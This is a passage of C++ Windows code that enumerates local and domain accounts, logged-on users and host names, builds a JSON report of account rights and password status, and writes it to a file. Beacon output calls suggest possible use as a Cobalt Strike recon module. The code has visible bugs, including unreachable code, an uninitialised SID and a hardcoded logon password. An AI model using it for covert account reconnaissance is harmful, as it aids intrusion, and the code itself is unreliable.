		if (udis->QueryInterface(IID_IADsUser, (void**)&user) >= S_OK) {
			BSTR	bstr = NULL;

			if (user->get_FullName(&bstr) >= S_OK) {
				wcscpy(full_name, bstr);
				::SysFreeString(bstr);
				ret = TRUE;
			}
			user->Release();
		}
		udis->Release();
	}
	ads->Release();
	::SysFreeString(buid);

	return	ret;
}

BOOL getUserName(CString& strDomainName)
{
	BOOL bRet = FALSE;
	// 获取当前登录的本地用户名  
	char username[256];
	DWORD usernameSize = sizeof(username);
	if (GetUserNameA(username, &usernameSize)) 
	{
		std::cout << "当前登录的本地用户名: " << username << std::endl;
	}
	else {
		std::cerr << "无法获取当前登录的本地用户名" << std::endl;
		return 1;
	}

	// 获取当前登录用户的域信息  
	PCHAR cpuName = new CHAR[256];
	PCHAR domainName = new CHAR[256];
	DWORD domainNameSize = 0;

	ZeroMemory(domainName, 256);

	GetComputerObjectNameA(NameSamCompatible, NULL, &domainNameSize);
	if (GetComputerObjectNameA(NameSamCompatible, cpuName, &domainNameSize)) 
	{
		std::wcout << "当前登录的域机器: " << cpuName << std::endl;
	}
	else 
	{
		std::cerr << "无法获取域信息" << std::endl;
	}

	domainNameSize = 0;
	GetUserNameExA(NameDisplay, NULL, &domainNameSize);
	if (GetUserNameExA(NameDisplay, domainName, &domainNameSize))
	{
		std::wcout << "当前登录的域用户: " << domainName << std::endl;

		if (!domainName[0])
		{
			return 0;
		}

		LPUSER_INFO_2 p_ui10 = 0;
		strDomainName = domainName;
		CString strtDomainName = domainName;

		int nPos = strtDomainName.Find("\\");
		CStringW swDN = strtDomainName.Left(nPos);
		CStringW swName = strtDomainName.Mid(nPos + 1);
		bRet = TRUE;
		return TRUE;
		if (NetUserGetInfo(swDN.GetBuffer(), swName.GetBuffer(), 2, (LPBYTE*)&p_ui10) == NERR_Success)
		{
			std::wstring fullname = p_ui10->usri2_full_name;

			NetApiBufferFree(p_ui10);

			return 0;
		}
		else
		{
			return 1;
		}

		if (p_ui10 != NULL)
		{
			NetApiBufferFree(p_ui10);
			p_ui10 = NULL;
		}
	}
	else {
		std::cerr << "无法获取域信息" << std::endl;
	}


	PSID pSID = (PSID) new BYTE[1024];

	CString saDomain = GetDomainName();

	// 验证和获取域用户信息  
	HANDLE tokenHandle = NULL;
	if (LogonUserA(username, saDomain, "Dowhile(1);return;", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &tokenHandle)) {
		TOKEN_USER userToken;
		DWORD userTokenSize = sizeof(TOKEN_USER);
		if (GetTokenInformation(tokenHandle, TokenUser, &userToken, sizeof(userToken), &userTokenSize)) {
			SID_NAME_USE sidType;
			char domainUser[256];
			DWORD domainUserSize = sizeof(domainUser);
			if (LookupAccountSidA(NULL, pSID, domainUser, &domainUserSize, NULL, NULL, &sidType)) {
				std::cout << "当前登录的域用户名: " << domainUser << std::endl;
			}
			else {
				std::cerr << "无法获取域用户信息" << std::endl;
			}
		}
		else {
			std::cerr << "无法获取令牌信息" << std::endl;
		}
		CloseHandle(tokenHandle);
	}
	else {
		std::cerr << "无法验证和登录域用户" << std::endl;
	}

	return bRet;
}

BOOL GetCurDomainUser(vector<UserAccount>& users)
{
	BOOL bRet = FALSE;
	CString ComputerName;
	CString DomainUserName;

	if (FALSE == IsDomainUser())
	{
		goto End;
	}

	// 获取机器名
	if (FALSE == GetCpuName(ComputerName))
	{
		goto End;
	}

	// 获取用户名
	if (FALSE == GetCurUserName(DomainUserName))
	{
		goto End;
	}

	// 获取用户名
	if (FALSE == GetLocalCurUserName(DomainUserName))
	{
		goto End;
	}

	bRet = SearchCurDomainUser(users, ComputerName, DomainUserName);

End:
	return bRet;
}

void GetHostNameWithWs()
{
	WSADATA wsaData;
	int nErr = WSAStartup(MAKEWORD(2, 2), &wsaData);//调用成功返回0，失败返回非0
	if (nErr)
	{
		nErr = GetLastError();
		return;
	}
	char szhostName[MAX_PATH] = { 0 };
	int nRet = gethostname(szhostName, MAX_PATH);

	printf("gethostname result: %s \n", szhostName);
}

BOOL GetCpuName(CString &strDeviceName)
{
	BOOL bRet = FALSE;
	WCHAR  sDomain[MAX_COMPUTERNAME_LENGTH + 2] = { 0 };
	DWORD  bufCharCount = MAX_COMPUTERNAME_LENGTH + 2;
	if (FALSE == GetComputerNameW(sDomain, &bufCharCount))
	{
		goto End;
	};

	strDeviceName = sDomain;
	bRet = TRUE;
	printf("GetComputerNameW result: %S \n", sDomain);
End:
	return bRet;
}

BOOL GetCurUserName(CString &strUserName)
{
	BOOL bRet = FALSE;
	WCHAR username[BUF_SIZE];
	DWORD usernameSize = sizeof(username);
	if (FALSE == GetUserNameW(username, &usernameSize)) 
	{
		goto End;
	};

	strUserName = username;
	bRet = TRUE;
	printf("GetUserName result: %S \n", username);
End:
	return bRet;
}

BOOL GetLocalCurUserName(CString& strUserName)
{
	BOOL bRet = FALSE;
	DWORD sessionId;
	LPWSTR ppBuffer[100];
	DWORD bufferSize;

	sessionId = WTSGetActiveConsoleSessionId();

	bRet = WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, sessionId, WTSUserName, ppBuffer, &bufferSize);

	printf(" GetLocal1CurUserName --> %s", *ppBuffer);

	if (bRet == TRUE)
	{
		strUserName = *ppBuffer;
		WTSFreeMemory(ppBuffer);
	}

End:
	return bRet;
}

BOOL ConvertStructToJson(vector<UserAccount>& sUsers, CString& strJson)
{
	static ULONG itemid_index = 1;
	BOOL bRet = FALSE;
	cJSON* pRoot = cJSON_CreateObject();
	if (pRoot)
	{
		cJSON* pData = cJSON_CreateObject();
		cJSON* pResult = NULL;

		do
		{
			if (pData == NULL)
			{
				printf("[SendResult] data null!!!");
				break;
			}

			pResult = cJSON_CreateArray();
			if (pResult == NULL)
			{
				printf("[SendResult] result null");
				break;
			}

			CStringA strItemId;
			for (auto& itemUser : sUsers)
			{
				cJSON* pItem = cJSON_CreateObject();
				if (pItem)
				{
					CStringA szaUser = CW2A(CStringW(itemUser.UserName), CP_UTF8);
					cJSON_AddStringToObject(pItem, "account_name", szaUser);

					// CStringA szaSID = CW2A(itemUser.strSID, CP_UTF8);
					CStringA szaSID = CW2A(CStringW(itemUser.strSID), CP_UTF8);
					cJSON_AddStringToObject(pItem, "account_id", szaSID);

					// CStringA szaDomain = CW2A(itemUser.strDomain, CP_UTF8);
					CStringA szaDomain = CW2A(CStringW(itemUser.strDomain), CP_UTF8);
					cJSON_AddStringToObject(pItem, "account_domain", szaDomain);

					if (itemUser.bAdmin)
					{
						cJSON_AddStringToObject(pItem, "account_rights", "1");
					}
					else
					{
						cJSON_AddStringToObject(pItem, "account_rights", "2");
					}

					if (itemUser.bDisabled)
					{
						cJSON_AddStringToObject(pItem, "account_status", "2");
					}
					else
					{
						cJSON_AddStringToObject(pItem, "account_status", "1");
					}

					// CStringA szGroup = CW2A(itemUser.strGroup, CP_UTF8);
					CStringA szGroup = CW2A(CStringW(itemUser.strGroup), CP_UTF8);
					cJSON_AddStringToObject(pItem, "account_group", szGroup);

					cJSON_AddStringToObject(pItem, "account_shell", "");

					CTime tNow = CTime::GetCurrentTime();
					if (itemUser.strLastLogon.IsEmpty())
					{
						if (itemUser.tmLastLogon > 0 && itemUser.tmLastLogon <= tNow.GetTime())
						{
							CTime tm = itemUser.tmLastLogon;
							CStringA sTime = tm.Format("%Y-%m-%d %H:%M:%S");
							cJSON_AddStringToObject(pItem, "last_login_time", sTime);
						}
						else
						{
							cJSON_AddStringToObject(pItem, "last_login_time", "");
						}
					}
					else
					{
						CStringA saLastLogon = itemUser.strLastLogon;
						cJSON_AddStringToObject(pItem, "last_login_time", saLastLogon);
					}

					cJSON_AddStringToObject(pItem, "account_gid", "0");
					cJSON_AddStringToObject(pItem, "account_login_type", "3");
					cJSON_AddStringToObject(pItem, "account_sudo", "2");

					CStringA sTmp = itemUser.strHomePath;
					cJSON_AddStringToObject(pItem, "account_homepath", sTmp);

					sTmp.Format("%d", itemUser.dwPwStatus);
					cJSON_AddStringToObject(pItem, "pw_status", sTmp);
					cJSON_AddStringToObject(pItem, "pw_change_time", itemUser.strPwdChangeTime);
					cJSON_AddStringToObject(pItem, "pw_expiry_time", itemUser.strPwdExpireTime);
					cJSON_AddStringToObject(pItem, "pw_lock_time", itemUser.strAccountType.IsEmpty()
						? "" : itemUser.strAccountType);
					cJSON_AddStringToObject(pItem, "account_type", itemUser.strAccountType);
					cJSON_AddStringToObject(pItem, "account_isdomain", itemUser.strIsDomain);

					cJSON* pKeys = cJSON_CreateArray();
					if (pKeys)
					{
						cJSON_AddItemToObject(pItem, "public_key", pKeys);
					}

					cJSON_AddItemToArray(pResult, pItem);
				}
			}

			bRet = TRUE;
		} while (FALSE);

		if (bRet)
		{
			cJSON_AddStringToObject(pData, "handler_type", "1");
			cJSON_AddItemToObject(pData, "result", pResult);

			cJSON_AddStringToObject(pRoot, "msg_type", "1");

			cJSON_AddItemToObject(pRoot, "data", pData);

			char* pLog = cJSON_PrintUnformatted(pRoot);
			// char* pLog = cJSON_Print(pRoot);
			if (pLog)
			{
				CString strLog = CA2W(pLog, CP_UTF8);

				strJson = strLog;
				free(pLog);
			}

			cJSON_Delete(pRoot);
		}
		else
		{
			if (pResult)
			{
				cJSON_Delete(pResult);
			}

			if (pData)
			{
				cJSON_Delete(pData);
			}

			cJSON_Delete(pRoot);
		}
	}

	printf("[SendMalAccountResult] bRet : %d", bRet);
	return bRet;
}


bool Get_LogUser(std::wstring& wsName)
{
	HWND hwnd = ::GetShellWindow();
	if (nullptr == hwnd) {
		return false;
	}

	DWORD dwProcessID = 0;
	GetWindowThreadProcessId(hwnd, &dwProcessID);
	if (0 == dwProcessID) {
		return false;
	}

	HANDLE hProc = NULL;
	HANDLE hToken = NULL;
	TOKEN_USER* pTokenUser = NULL;

	// Open the process with PROCESS_QUERY_INFORMATION access
	hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
	if (hProc == NULL)
	{
		return false;
	}
	if (!OpenProcessToken(hProc, TOKEN_QUERY, &hToken))
	{
		return false;
	}

	DWORD dwNeedLen = 0;
	GetTokenInformation(hToken, TokenUser, NULL, 0, &dwNeedLen);
	if (dwNeedLen > 0)
	{
		pTokenUser = (TOKEN_USER*)new BYTE[dwNeedLen];
		if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwNeedLen, &dwNeedLen))
		{
			return false;
		}
	}
	else
	{
		return false;
	}

	SID_NAME_USE sn;
	WCHAR szDomainName[MAX_PATH];
	DWORD dwDmLen = MAX_PATH;

	WCHAR wstrName[MAX_PATH] = {};
	DWORD nNameLen = MAX_PATH;
	LookupAccountSidW(NULL, pTokenUser->User.Sid, wstrName, &nNameLen,
		szDomainName, &dwDmLen, &sn);

	wsName = wstrName;

	if (hProc)
		::CloseHandle(hProc);
	if (hToken)
		::CloseHandle(hToken);
	if (pTokenUser)
		delete[](char*)pTokenUser;

	return true;
}


void main(int argc, const char* argv[])
{
	CString strtDomainName;
	getUserName(strtDomainName);

	getchar();

	IsDomainUser();

	getchar();
	
	wstring wsLogUser;
	Get_LogUser(wsLogUser);
	std::wcout << "Get_LogUser:" << wsLogUser.c_str() << endl;
	getchar();

	vector<UserAccount> users;
	GetUsers(users);
	GetCurDomainUser(users);

	getchar();
	std::cout << "--------" << endl;

	wstring user, domain;
	GetCurrentUserAndDomain(user, domain);

	std::wcout << user.c_str() << " " << domain.c_str() << endl;

	return;

	CString strJson;
	ConvertStructToJson(users, strJson);

	ofstream outfile;
	outfile.open("afile.dat");
	outfile << strJson.GetBuffer() << endl;
	outfile.close();

	// GetFullDeviceName();

	GetHostNameWithWs();

	SearchDirectory(NULL, L"*", FALSE, L"0");
	BeaconOutputStreamW();
	BeaconPrintToStreamW(L"--------------------------------------------------------------------\n");
	return;
}